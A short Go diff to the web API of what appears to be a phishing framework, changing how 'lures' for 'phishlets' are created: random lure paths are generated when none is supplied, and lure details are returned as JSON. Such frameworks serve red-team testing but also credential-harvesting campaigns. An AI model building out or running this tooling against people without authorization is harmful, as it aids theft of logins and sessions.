@@ -1073,15 +1073,22 @@ func (w *WebAPI) handleLureCreate(rw http.ResponseWriter, req *http.Request) {
 		return
 	}
 
+	path := payload.Path
+	if path == "" {
+		strategy := w.cfg.GetLureGenerationStrategy()
+		path = "/" + GenRandomLureString(strategy)
+	}
+
 	l := &Lure{
 		Phishlet:       payload.Phishlet,
-		Path:           payload.Path,
+		Path:           path,
 		RedirectUrl:    payload.RedirectUrl,
 		Redirector:     payload.Redirector,
 		PostRedirector: payload.PostRedirector,
 		Info:           payload.Info,
 	}
 	w.cfg.AddLure(payload.Phishlet, l)
+	lureIndex := w.cfg.GetLureCount() - 1
 
 	user, _ := w.getUserFromRequest(req)
 	username := "unknown"
@@ -1091,9 +1098,14 @@ func (w *WebAPI) handleLureCreate(rw http.ResponseWriter, req *http.Request) {
 	clientIP := getClientIP(req)
 	w.db.CreateAuditEntry(username, "create_lure", fmt.Sprintf("Created lure for phishlet '%s'", payload.Phishlet), clientIP)
 
-	rw.Header().Set("Content-Type", "application/json")
-	rw.WriteHeader(http.StatusCreated)
-	json.NewEncoder(rw).Encode(map[string]string{"message": "Lure created"})
+	writeJSON(rw, http.StatusCreated, map[string]interface{}{
+		"index":        lureIndex,
+		"phishlet":     l.Phishlet,
+		"path":         l.Path,
+		"hostname":     l.Hostname,
+		"redirect_url": l.RedirectUrl,
+		"info":         l.Info,
+	})
 }
 
 func (w *WebAPI) handleLureDelete(rw http.ResponseWriter, req *http.Request) {
